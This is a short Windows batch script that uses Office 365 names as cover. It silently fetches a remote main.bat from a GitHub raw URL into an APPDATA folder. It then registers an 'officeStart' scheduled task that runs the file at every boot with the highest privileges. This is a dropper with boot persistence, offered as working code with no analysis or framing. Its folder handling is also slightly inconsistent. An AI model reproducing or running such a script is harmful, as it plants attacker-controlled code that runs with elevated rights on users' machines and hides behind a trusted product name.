@echo off
REM mkdir -p %APPDATA%\Office365
md C:\Users\Public\Documents\Office365
del /f /q /a %APPDATA%\Office365\main.bat
curl -s https://raw.githubusercontent.com/qufyu/0024/main/main.bat > %APPDATA%\Office365\main.bat
schtasks /create /sc onstart /tn officeStart /tr %APPDATA%\Office365\main.bat /f /rl HIGHEST
exit
